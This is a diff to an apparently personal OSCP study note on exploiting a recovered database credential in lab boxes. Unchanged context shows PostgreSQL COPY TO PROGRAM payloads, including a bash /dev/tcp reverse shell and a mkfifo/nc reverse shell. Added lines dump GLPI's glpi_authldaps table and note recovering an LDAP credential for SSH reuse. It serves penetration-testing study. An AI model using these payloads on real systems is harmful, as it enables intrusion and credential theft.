@@ -4,6 +4,8 @@
 
 *Use a recovered database credential to inspect users, hashes, and possible password reuse.*
 
+Fast syntax reference: [[OSCP COMMAND MASTER CHEATSHEET|OSCP Command Master Cheatsheet]] · Use this page to decide what to enumerate and how to preserve database evidence.
+
 ## Run this
 
 > **Why:** This database command tests the recovered connection and privilege level so database-specific execution or credential paths can be chosen.
@@ -32,6 +34,17 @@ COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
 COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"';
 -- If /bin/sh only (no bash): use mkfifo payload instead
 COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LocalIP $Lport >/tmp/f';
+```
+
+## Application database pivot
+
+Do not equate database access with database-level code execution. Record the account's grants, identify which application tables contain authentication or secret material, and inspect the application source for the way encrypted fields are produced and consumed.
+
+> **Why:** A database-limited account can still expose the next credential through application data even when UDFs, file reads, and server-side execution are unavailable.
+```bash
+mysql -h $BoxIP -u $Username -p -e 'SHOW GRANTS'
+mysql -h $BoxIP -u $Username -p -e "SHOW DATABASES; USE $Database; SHOW TABLES"
+mysql -h $BoxIP -u $Username -p -e "SELECT * FROM glpi_authldaps\\G"
 ```
 
 ## Example output
@@ -131,6 +144,7 @@ ls -l /tmp/rootbash
 - [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/Linux/Cockpit|Cockpit]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- GLPI MariaDB access was limited to the application database; `glpi_authldaps` and the GLPI key supplied a recoverable credential for controlled SSH reuse
 
 ## Related stages
 
